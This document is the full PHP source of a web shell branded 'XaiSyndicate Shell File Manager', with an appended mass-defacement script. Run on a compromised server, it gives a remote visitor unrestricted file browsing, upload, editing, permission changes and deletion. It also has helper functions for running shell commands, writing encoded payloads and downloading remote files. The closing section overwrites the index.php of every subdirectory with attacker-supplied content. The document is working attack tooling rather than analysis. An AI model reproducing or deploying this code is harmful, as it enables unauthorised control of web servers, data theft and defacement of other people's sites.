<?php
define('VERSION', '3.0');

function anoaghostSize($s) {
    if (is_int($s))
        $s = sprintf("%u", $s);
    
	if($s >= 1073741824)
		return sprintf('%1.2f', $s / 1073741824 ). ' GB';
	elseif($s >= 1048576)
		return sprintf('%1.2f', $s / 1048576 ) . ' MB';
	elseif($s >= 1024)
		return sprintf('%1.2f', $s / 1024 ) . ' KB';
	else
		return $s . ' B';
}

	$freeSpace = @diskfreespace($GLOBALS['cwd']);
	$totalSpace = @disk_total_space($GLOBALS['cwd']);
	$totalSpace = $totalSpace?$totalSpace:1;
	
//hdd
function convertByte($s) {
if($s >= 1073741824)
return sprintf('%1.2f',$s / 1073741824 ).' GB';
elseif($s >= 1048576)
return sprintf('%1.2f',$s / 1048576 ) .' MB';
elseif($s >= 1024)
return sprintf('%1.2f',$s / 1024 ) .' KB';
else
return $s .' B';
}
function exe($cmd){
	if(function_exists('system')) {
		@ob_start();
		@system($cmd);
		$buff = @ob_get_contents();
		@ob_end_clean();
		return $buff;
	}
	elseif(function_exists('exec')) {
		@exec($cmd,$results);
		$buff = "";
		foreach($results as $result){
			$buff .= $result;
		}
		return $buff;
	}
	elseif(function_exists('passthru')) {
		@ob_start();
		@passthru($cmd);
		$buff = @ob_get_contents();
		@ob_end_clean();
		return $buff;
	}
	elseif(function_exists('shell_exec')){
		$buff = @shell_exec($cmd);
		return $buff;
	}
}

function tulis($file,$text){
	$textz = gzinflate(base64_decode($text));
	 if($filez = @fopen($file,"w"))
	 {
		 @fputs($filez,$textz);
		 @fclose($file);
	 }
}

function ambil($link,$file) { 
   if($fp = @fopen($link,"r")){
	   while(!feof($fp)) { 
   		    $cont.= @fread($fp,1024); 
   		} 
   		@fclose($fp); 
	   $fp2 = @fopen($file,"w"); 
	   @fwrite($fp2,$cont); 
	   @fclose($fp2); 
   }
}



$admin_id=$_SERVER['SERVER_ADMIN'];


echo '<!DOCTYPE HTML>
<HTML>
<HEAD>
<link href="" rel="stylesheet" type="text/css">
<meta property="og:image" content="https://1.bp.blogspot.com/-TK72Nslcuew/WDQ_pi4c6yI/AAAAAAAAAX4/N3mJdMHmCiMOI1PzFBl4nwI0ma5HDrvngCLcB/s1600/LtukEJN.png">
<link href="https://1.bp.blogspot.com/-TK72Nslcuew/WDQ_pi4c6yI/AAAAAAAAAX4/N3mJdMHmCiMOI1PzFBl4nwI0ma5HDrvngCLcB/s1600/LtukEJN.png" rel="SHORTCUT ICON" type="image/png">
<title>SHELL AUTO SAGNE PRIV6,Acak Acakan'.VERSION.'</title>
<body>
<style>
body{
font-family: "Racing Sans One", cursive;
background:url("http://jindalelec.co.ke/691916.png") black;
background-size: cover;
background-attachment: fixed;
color: white;
}
#content tr:hover{
background-color: red;
text-shadow:0px 0px 10px #fff;
}
#content .first{
background-color: blue;
}
#content .first:hover{
background-color: silver;
text-shadow:0px 0px 1px #757575;
}
.gaya {
	color: blue;
}
.paloco{
background:white;
color:#000000;
padding:8px;
}
table{
border: 2px lime dotted;
}
H1{
font-family: "Rye", cursive;
}
a{
color: lime;
text-decoration: none;
}
a:hover{
color: red;
text-shadow:0px 0px 10px #ffffff;
}
input,select,textarea{
border: 1px red solid;
-moz-border-radius: 5px;
-webkit-border-radius:5px;
border-radius:5px;
}
#menu{
	background:#111111;
	margin:8px 2px 4px 2px;
}
#menu a{
	padding:4px 18px;
	margin:0;
	background:#222222;
	text-decoration:none;
	letter-spacing:1px;
	-moz-border-radius: 5px; -webkit-border-radius: 5px; -khtml-border-radius: 5px; border-radius: 5px;

}
#menu a:hover{
	background:#191919;
	border-bottom:1px solid #333333;
	border-top:1px solid #333333;
}
</style>
</HEAD>
<BODY>
<H1><center><font style="text-shadow: 0 0 6px #FF0000, 0 0 5px #FF0000, 0 0 5px #FF0000;"><b>XaiSyndicate Shell File Manager</b></font></center></H1><br><center><a href="njirr"><img src="https://1.bp.blogspot.com/-TK72Nslcuew/WDQ_pi4c6yI/AAAAAAAAAX4/N3mJdMHmCiMOI1PzFBl4nwI0ma5HDrvngCLcB/s1600/LtukEJN.png" width="15%" height="15%"></a>
<br>
<table bordercolor=lime width="600" border="600" cellpadding="1" cellspacing="1" align=center><tr><td>
<center>-=| <b><font face=Agency FB color=lime size=3>Host:</b> '.$_SERVER["HTTP_HOST"].' | <font>
<b><font face=Agency FB color=red size=3>IP:</b> '.gethostbyname($_SERVER["HTTP_HOST"]).' | </font>
<b><font face=Agency FB color=orange size=3>Your ip:</b> '.$_SERVER["REMOTE_ADDR"].' |=- <br>
<b><font face=Agency FB color=magenta size=2>Uname:</b> ' . substr(@php_uname(), 0, 120) . ' |=-<br>
<b><font face=Agency FB size=3 color=#00FF1E><span>Free Disk: <b>'.convertByte(disk_free_space('/')).' / '.convertByte(disk_total_space('/')).'</b></span><br>
<b><font face=Agency FB size=2><span>Admin : <b><a href='.$admin_id.'><font style=color:white>'.$admin_id.'</font></a><br>
<font color="red" style="text-shadow: 0 0 6px aqua, 0 0 5px aqua, 0 0 5px #FF0000;">Visit My FB :
<a href="facebook.com/vicry.ahmad.9"><font color="white" style="text-shadow: 0 0 6px aqua, 0 0 5px aqua, 0 0 5px #FF0000;">facebook.com/vicry.ahmad.9</a></font></b>
</font></tr></td></table><br>
</center>
<table width="500" border="500" cellpadding="1" cellspacing="1" align="center">
<tr><td>Current Path : ';
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = getcwd();
}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);

foreach($paths as $id=>$pat){
if($pat == '' && $id == 0){
$a = true;
echo '<a href="?path=/">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?path=';
for($i=0;$i<=$id;$i++){
echo "$paths[$i]";
if($i != $id) echo "/";
}
echo '">'.$pat.'</a>/';
}
echo '</td></tr><tr><td>';
if(isset($_FILES['file'])){
if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
echo '<font color="green">Success to Upload.</font><br />';
}else{
echo '<font color="red">Failed to Upload.</font><br />';
}
}
echo '<form enctype="multipart/form-data" method="POST">
Upload File : <input type="file" name="file" />
<input type="submit" value="upload" />
</form>
</td></tr><br>';
if(isset($_GET['filesrc'])){
echo "<tr><td>Current File : ";
echo $_GET['filesrc'];
echo '</tr></td></table><br />';
echo('<center><textarea class="paloco" rows="10" cols="100" style="font-weight:bold;background:transparent;color:white;">'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</textarea></center>');
}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
if($_POST['opt'] == 'chmod'){
if(isset($_POST['perm'])){
if(chmod($_POST['path'],$_POST['perm'])){
echo '<font color="green">Change Permission Done.</font><br />';
}else{
echo '<font color="red">Change Permission Error.</font><br />';
}
}
echo '<form method="POST">
Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="chmod">
<input type="submit" value="Go" />
</form>';
}elseif($_POST['opt'] == 'rename'){
if(isset($_POST['newname'])){
if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
echo '<font color="green">Change Name Done.</font><br />';
}else{
echo '<font color="red">Change Name Error.</font><br />';
}
$_POST['name'] = $_POST['newname'];
}
echo '<form method="POST">
Rename File : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="rename">
<input type="submit" value="Go" />
</form>';
}elseif($_POST['opt'] == 'edit'){
if(isset($_POST['src'])){
$fp = fopen($_POST['path'],'w');
if(fwrite($fp,$_POST['src'])){
echo '<font color="green">Edit File Done.</font><br />';
}else{
echo '<font color="red">Edit File Error.</font><br />';
}
fclose($fp);
}
echo'<form method="POST">
<textarea cols="100" rows="20" name="src" style="color:white;font-weight:bold;">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="edit">
<tr><td colspan="2">Save as <input oncontextmenu="return false" onmousedown="return false" id="cmd" class="inputz" name="saveas" style="width:60%;" value="'.$_POST['path'].'" /><input type="submit" value="Submit" /> </td></tr>
</form>';
}
echo '</center>';
}else{
echo '</table><br /><center>';
if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
echo '<font color="green">Delete Dir Done.</font><br />';
}else{
echo '<font color="red">Delete Dir Error.</font><br />';
}
}elseif($_POST['type'] == 'file'){
if(unlink($_POST['path'])){
echo '<font color="green">Delete File Done.</font><br />';
}else{
echo '<font color="red">Delete File Error.</font><br />';
}
}
}
echo '</center>';
$scandir = scandir($path);
echo '<div id="content"><table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr class="first">
<td><center>Name</center></td>
<td><center>Size</center></td>
<td><center>Permissions</center></td>
<td><center>Options</center></td>
</tr>';

foreach($scandir as $dir){
if(!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue;
echo "<tr>
<td><a href=\"?path=$path/$dir\"><font color='orange'>$dir</font></a></td>
<td><center>--</center></td>
<td><center>";
if(is_writable("$path/$dir")) echo '<font color="lime">';
elseif(!is_readable("$path/$dir")) echo '<font color="red">';
echo perms("$path/$dir");
if(is_writable("$path/$dir") || !is_readable("$path/$dir")) echo '</font>';

echo "</center></td>
<td><center><form method=\"POST\" action=\"?option&path=$path\">
<select name=\"opt\">
<option value=\"\"></option>
<option value=\"delete\">Delete</option>
<option value=\"chmod\">Chmod</option>
<option value=\"rename\">Rename</option>
</select>
<input type=\"hidden\" name=\"type\" value=\"dir\">
<input type=\"hidden\" name=\"name\" value=\"$dir\">
<input type=\"hidden\" name=\"path\" value=\"$path/$dir\">
<input type=\"submit\" value=\">\" />
</form></center></td>
</tr>";
}
echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
foreach($scandir as $file){
if(!is_file("$path/$file")) continue;
$size = filesize("$path/$file")/1024;
$size = round($size,3);
if($size >= 1024){
$size = round($size/1024,2).' MB';
}else{
$size = $size.' KB';
}

echo "<tr>
<td><a href=\"?filesrc=$path/$file&path=$path\"><font color='yellow'>$file</font></a></td>
<td><center>".$size."</center></td>
<td><center>";
if(is_writable("$path/$file")) echo '<font color="lime">';
elseif(!is_readable("$path/$file")) echo '<font color="red">';
echo perms("$path/$file");
if(is_writable("$path/$file") || !is_readable("$path/$file")) echo '</font>';
echo "</center></td>
<td><center><form method=\"POST\" action=\"?option&path=$path\">
<select name=\"opt\">
<option value=\"edit\">Edit</option>
<option value=\"delete\">Delete</option>
<option value=\"chmod\">Chmod</option>
<option value=\"rename\">Rename</option>
</select>
<input type=\"hidden\" name=\"type\" value=\"file\">
<input type=\"hidden\" name=\"name\" value=\"$file\">
<input type=\"hidden\" name=\"path\" value=\"$path/$file\">
<input type=\"submit\" value=\">\" />
</form></center></td>
</tr>";
}
echo '</table>
</div>';
}
echo '<br /><center>
<footer style="position:fixed; left:1px; right:0px; top:0px; border-bottom: 1px solid white ;background:#222;">
<font>-= XaiSyndicate Shell File Manager <font color="red">v'.VERSION.';</font>, c0d3d By <font color="red">XaiSyndicate - MyAdventure <font color=aqua>=-</font>
</footer></center>
</BODY>
</HTML>';
function perms($file){
$perms = fileperms($file);

if (($perms & 0xC000) == 0xC000) {
// Socket
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
// Symbolic Link
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
// Regular
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
// Block special
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
// Directory
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
// Character special
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
// FIFO pipe
$info = 'p';
} else {
// Unknown
$info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));

return $info;
}
?>
<br><hr>
<?php
/*
Script: Mass Deface Script
*/
echo "<center><br><font color='red' size='7'>Mass Deface URL By ./Mr403Forbidden</font><br><textarea rows='10' cols='100' style='font-weight:bold;background:transparent;color:lime;'>";
$defaceurl = $_POST['massdefaceurl'];
$dir = $_POST['massdefacedir'];
echo $dir . "
";
if (is_dir($dir)) {
    if ($dh = opendir($dir)) {
        while (($file = readdir($dh)) !== false) {
            if (filetype($dir . $file) == "dir") {
                $newfile = $dir . $file . "/index.php";
                echo $newfile . "
";
                if (!copy($defaceurl, $newfile)) {
                    echo "failed to copy $file...
";
                }
            }
        }
        closedir($dh);
    }
}
echo "</textarea></center>";
?>

<center>
<td align=center>Mass Defacement:</td><br>
	</div>
<form action='<?php basename($_SERVER['PHP_SELF']); ?>' method='post'>
<div class="style31">
[+] Main Directory: <input type='text' style='width: 250px' value='<?php echo getcwd() . "/"; ?>' name='massdefacedir'>
[+] Defacement Url: <input type='text' style='width: 250px' name='massdefaceurl'>
<input type='submit' name='execmassdeface' value='Execute'></div>
	</form></td></center><br><br></body>
</html>
